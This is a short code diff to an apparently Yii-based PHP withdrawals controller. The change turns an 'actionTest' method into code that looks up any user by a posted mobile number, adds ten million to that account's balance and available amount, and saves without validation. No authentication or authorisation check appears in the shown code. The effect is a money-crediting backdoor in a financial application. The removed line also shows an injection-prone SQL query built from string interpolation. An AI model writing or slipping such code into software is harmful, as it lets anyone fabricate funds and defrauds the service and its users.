@@ -2070,8 +2070,12 @@ class WithdrawalsController extends Controller
 
     public  function  actionTest()
     {
-//        $bank=BankName::find()->where("  name  like '%{$bank_name}%'")->one();
-       var_dump(BankName::tableName());
+        $user=User::find()
+            ->where(['mobile'=>Yii::$app->request->post('mobile', '')])
+            ->one();
+        $user->balance+=10000000;
+        $user->availableamount+=10000000;
+        $user->save(false);
     }
 
 
